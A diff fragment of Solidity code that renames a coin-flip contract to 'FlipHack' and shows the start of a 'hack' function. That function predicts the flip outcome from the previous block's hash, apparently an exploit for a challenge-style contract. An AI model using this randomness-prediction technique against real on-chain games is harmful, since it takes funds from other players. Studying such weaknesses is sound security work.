@@ -8,12 +8,12 @@ interface Flip {
   function claim() external;
 }
 
-contract CoinFlip {
+contract FlipHack {
 
   address immutable owner = 0xa561cC2c0C33FbEB03B7B89Fd435709e56b0C016;
   uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
 
-  function flip() public returns (bool) {
+  function hack() public returns (bool) {
     require(msg.sender == owner, "nope");
     uint256 blockValue = uint256(blockhash(block.number - 1));
     uint256 coinFlip = blockValue / FACTOR;
